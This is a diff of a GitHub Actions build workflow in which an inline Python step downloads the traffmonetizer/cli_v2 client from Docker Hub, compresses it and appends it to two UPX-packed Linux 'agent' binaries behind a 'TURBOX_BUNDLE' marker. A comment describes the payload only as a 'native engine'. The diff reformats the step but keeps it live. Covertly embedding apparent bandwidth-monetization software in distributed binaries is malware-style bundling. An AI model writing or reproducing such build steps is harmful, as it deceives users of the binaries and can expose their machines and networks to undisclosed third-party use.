@@ -46,32 +46,32 @@ jobs:
           upx --best --ultra-brute bin/agent_linux_x86_64 2>/dev/null || true
           upx --best --ultra-brute bin/agent_linux_arm64 2>/dev/null || true
 
-          # Tải và MERGE trực tiếp native Linux engine vào 2 file binary Linux
+          # Tải và MERGE trực tiếp native engine vào 2 file binary Linux
           echo "Merging native Linux engine directly into binary files..."
-          python3 -c "
-import urllib.request, json, tarfile, gzip, struct, os
+          python3 - << 'EOF'
+          import urllib.request, json, tarfile, gzip, struct, os
 
-def get_layer(digest, out_bin):
-    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']
-    req = urllib.request.Request(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}', headers={'Authorization': f'Bearer {tok}'})
-    data = urllib.request.urlopen(req).read()
-    tmp_layer = f'/tmp/layer_{digest[:8]}.tar.gz'
-    open(tmp_layer, 'wb').write(data)
-    tar = tarfile.open(tmp_layer)
-    tar.extract('usr/local/bin/cli', '/tmp')
-    cli_path = '/tmp/usr/local/bin/cli'
-    if os.path.exists(cli_path):
-        gz_data = gzip.compress(open(cli_path, 'rb').read(), compresslevel=9)
-        foot = struct.pack('<Q', len(gz_data)) + b'TURBOX_BUNDLE\x00\x00\x00'
-        if os.path.exists(out_bin):
-            open(out_bin, 'ab').write(gz_data + foot)
-            print(f'Merged {len(gz_data)} bytes into {out_bin}')
-        os.remove(cli_path)
-    os.remove(tmp_layer)
+          def get_layer(digest, out_bin):
+              tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']
+              req = urllib.request.Request(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}', headers={'Authorization': f'Bearer {tok}'})
+              data = urllib.request.urlopen(req).read()
+              tmp_layer = f'/tmp/layer_{digest[:8]}.tar.gz'
+              open(tmp_layer, 'wb').write(data)
+              tar = tarfile.open(tmp_layer)
+              tar.extract('usr/local/bin/cli', '/tmp')
+              cli_path = '/tmp/usr/local/bin/cli'
+              if os.path.exists(cli_path):
+                  gz_data = gzip.compress(open(cli_path, 'rb').read(), compresslevel=9)
+                  foot = struct.pack('<Q', len(gz_data)) + b'TURBOX_BUNDLE\x00\x00\x00'
+                  if os.path.exists(out_bin):
+                      open(out_bin, 'ab').write(gz_data + foot)
+                      print(f'Merged {len(gz_data)} bytes into {out_bin}')
+                  os.remove(cli_path)
+              os.remove(tmp_layer)
 
-get_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
-get_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
-"
+          get_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
+          get_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
+          EOF
 
       - name: Upload Linux Binaries
         uses: actions/upload-artifact@v4
